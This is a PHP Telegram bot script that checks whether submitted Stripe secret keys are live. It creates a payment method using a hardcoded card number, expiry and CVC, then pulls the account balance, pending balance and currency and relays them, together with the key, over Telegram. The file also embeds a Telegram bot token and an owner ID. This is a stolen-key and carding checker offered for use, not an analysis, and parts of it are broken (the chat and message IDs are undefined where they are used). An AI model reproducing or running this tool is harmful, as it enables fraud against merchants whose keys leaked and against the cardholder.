$botToken = "7295049618:AAE35fuzIS7vIXMVYfsQy30RtQXXHVHKxHU";
$ownerID = "7113416108";

function sendMessage($chatId, $message, $messageId) {
    $url = "https://api.telegram.org/bot".$GLOBALS['botToken']."/sendMessage?chat_id=".$chatId."&text=".$message."&parse_mode=HTML";
    if ($messageId) {
        $url .= "&reply_to_message_id=".$messageId;
    }
    file_get_contents($url);
}

function Getstr($string,$start,$end) {
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

function process_message($message) {
    if ((strpos($message, "/sk") === 0) || (strpos($message, "sk_live_") === 0) || (strpos($message, ".sk") === 0)) {
        if ((strpos($message, "/sk") === 0) || (strpos($message, ".sk") === 0)) {
            $sk = substr($message, 4);
        } else {
            $sk = $message;
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=4102770015058552&card[exp_month]=06&card[exp_year]=24&card[cvc]=997');
        $stripe1 = curl_exec($ch);
        if ((strpos($stripe1, 'declined')) || (strpos($stripe1, 'pm_'))) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            $headers = array(
                'Authorization: Bearer '.$sk.'',
            );
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $stripe = curl_exec($ch);
            $balance = trim(strip_tags(Getstr($stripe,' "amount":',',')));
            $pbalance = trim(strip_tags(Getstr($stripe,' "pending": [ { "amount": ',',')));
            $Currency = trim(strip_tags(Getstr($stripe,'"currency": "','",')));
            $livmsg = urlencode("
🟢 Successfully retrieved Stripe details:

Stripe Key: <code>$sk</code>
Balance: $balance 
Pending Balance: $pbalance
Currency: $Currency

[Owner ID - ".$GLOBALS['ownerID']."]
");
            sendMessage($chatId,$livmsg,$messageId);
            exit;
        } elseif (strpos($stripe1, 'rate_limit')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            $headers = array(
                'Authorization: Bearer '.$sk.'',
            );
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $stripe = curl_exec($ch);
            $balance = trim(strip_tags(Getstr($stripe,' "amount":',',')));
            $pbalance = trim(strip_tags(Getstr($stripe,' "pending": [ { "amount": ',',')));
            $Currency = trim(strip_tags(Getstr($stripe,'"currency": "','",')));
            $livmsg = urlencode("
🟢 Successfully retrieved Stripe details:

Stripe Key: <code>$sk</code>
Balance: $balance 
Pending Balance: $pbalance
Currency: $Currency

[Owner ID - ".$GLOBALS['ownerID']."]
");
            sendMessage($chatId,$livmsg,$messageId);
            exit;
        } elseif (strpos($stripe1, 'Your account cannot currently make live charges.')) {
            $skmsg=urlencode("
❌ Stripe key is dead.

Stripe Key: <code>$sk</code>
Reason: Your account cannot currently make live charges.

[Owner ID - ".$GLOBALS['ownerID']."]
");
        } elseif (strpos($stripe1, 'Expired API Key provided')) {
            $skmsg=urlencode("
❌ Stripe key is dead.

Stripe Key: <code>$sk</code>
Reason: Expired API Key provided.

[Owner ID - ".$GLOBALS['ownerID']."]
");
        } elseif (strpos($stripe1, 'The API key provided does not allow requests from your IP address.')) {
            $skmsg=urlencode("
❌ Stripe key is dead.

Stripe Key: <code>$sk</code>
Reason: The API key provided does not allow requests from your IP address.

[Owner ID - ".$GLOBALS['ownerID']."]
");
        } else {
            $skmsg = Getstr($stripe1, '"message": "', '"');
            $skmsg=urlencode("
❌ Stripe key is dead.

Stripe Key: <code>$sk</code>
Reason: $skmsg

[Owner ID - ".$GLOBALS['ownerID']."]
");
        }
        sendMessage($chatId,$skmsg,$messageId);
    }
}
